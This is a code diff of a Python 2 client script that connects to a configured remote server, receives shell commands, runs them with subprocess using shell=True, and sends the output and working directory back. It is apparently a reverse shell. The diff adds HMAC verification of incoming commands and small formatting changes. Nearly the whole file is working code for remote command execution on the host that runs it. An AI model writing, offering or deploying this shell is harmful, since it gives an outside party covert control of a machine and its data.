@@ -1,31 +1,54 @@
 # client.py
+import socket
+import subprocess
+import ConfigParser
+import os
+import hmac
+import hashlib
+
 config_path = os.path.join('config.ini')
-# os.path.exists(config_path)
-# cwd = os.getcwd()
-# print(cwd)
 config = ConfigParser.ConfigParser()
 config.read(config_path)
-
 HOST = config.get('Server', 'address')
 PORT = int(config.get('Server', 'port'))
-BUFFER = 4096
+BUFFER = int(config.get('Format', 'buffer'))
 SEP = "<sep>"
-
+SECRET_KEY = config.get('Authentication', 'key')
 error_outputs = ["Invalid command", "No such file or directory"]
 exit_inputs = ['exit', 'quit', 'q', 'close', 'shutdown', 'bye', 'goodbye']
+
+def verify_hmac(command, received_hmac):
+    """Verify the HMAC of the received command"""
+    calculated_hmac = hmac.new(
+        str(SECRET_KEY),
+        str(command),
+        hashlib.sha256
+    ).hexdigest()
+    return calculated_hmac == received_hmac
 
 def shell():
     while True:
         try:
-            command = client_socket.recv(BUFFER).decode()
+            # Receive command and HMAC
+            data = client_socket.recv(BUFFER)
+            command, received_hmac = data.split(SEP)
+
+            # Verify HMAC
+            if not verify_hmac(command, received_hmac):
+                output = "Authentication failed - command rejected"
+                cwd = os.getcwd()
+                message = str(output) + SEP + str(cwd)
+                client_socket.send(message)
+                continue
+
             split_command = command.split()
             is_empty = not command.strip()
-
+            
             if is_empty:
                 output = error_outputs[0]
                 cwd = os.getcwd()
-                message = output + SEP + cwd
-                client_socket.send(message.encode())
+                message = str(output) + SEP + str(cwd)
+                client_socket.send(message)
                 continue
             elif split_command[0].lower() == "cd":
                 try:
@@ -40,8 +63,12 @@ def shell():
                 break
             else:
                 try:
-                    process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE,
-                                               stderr = subprocess.PIPE)
+                    process = subprocess.Popen(
+                        command, 
+                        shell=True, 
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE
+                    )
                     stdout, stderr = process.communicate()
                     if stdout:
                         output = stdout
@@ -51,13 +78,12 @@ def shell():
                     output = str(exception)
 
             cwd = os.getcwd()
-            message = output + SEP + cwd
+            message = str(output) + SEP + str(cwd)
             client_socket.send(message)
 
         except Exception as exception:
             print("Error: %s" % exception)
             break
-
 
 def main():
     global client_socket
@@ -65,14 +91,12 @@ def main():
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((HOST, PORT))
         cwd = os.getcwd()
-        client_socket.send(cwd)
+        client_socket.send(str(cwd))
         shell()
-
     except Exception as exception:
         print("Connection error: %s" % exception)
     finally:
         client_socket.close()
-
 
 if __name__ == "__main__":
     main()
